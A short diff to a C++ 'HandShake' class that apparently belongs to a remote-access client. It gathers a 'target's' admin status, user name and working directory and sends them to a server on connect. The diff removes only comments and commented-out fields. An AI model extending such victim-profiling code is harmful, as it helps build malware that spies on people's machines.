@@ -12,9 +12,6 @@ class HandShake
 /*
 Collect the first information unavailable to the program and manages the client's first actions  .
 Sends the primary information when the client connects.
-
-1- performs the first action of the program.
-2- Send the first information to the server.
 */
     public:
 
@@ -50,9 +47,6 @@ Sends the primary information when the client connects.
     private:
         bool a_is_admin=false;// check if target is admin or not.
         string a_name_prog;
-        //string a_time; //Time to run program
-        // string a_date;
-        // string a_key; // key for cipher.
         string a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
         string a_current_directory; //Location of programme execute.
         string a_location_prog; //Location of the program once moved or not moved
